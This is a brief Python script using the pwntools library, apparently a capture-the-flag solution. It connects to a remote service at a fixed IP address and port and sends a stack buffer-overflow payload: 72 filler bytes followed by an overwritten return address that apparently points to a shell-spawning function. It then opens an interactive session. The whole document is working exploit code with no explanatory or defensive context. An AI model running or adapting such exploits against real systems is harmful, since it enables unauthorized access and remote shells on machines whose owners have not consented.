from pwn import*
 
r=remote("34.123.15.202",5000)

offset=72

shell=p64(0x0000000000401136)
payload=b"A"*72+shell


r.sendline(payload)
r.interactive()